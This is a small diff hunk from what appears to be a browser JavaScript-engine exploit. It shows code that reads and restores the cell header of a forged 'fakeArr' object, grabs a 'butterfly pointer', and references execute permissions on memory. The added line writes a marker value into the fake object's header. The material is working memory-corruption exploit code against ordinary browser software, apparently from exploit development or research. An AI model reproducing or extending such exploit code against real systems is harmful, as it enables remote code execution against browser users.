@@ -505,6 +505,7 @@ var VM_PROT_EXECUTE = 0x4
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+            fakeArr[0] = new Int64(0x414141414141).asDouble()
             // fix broken cell header
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
             // grab a real butterfly pointer
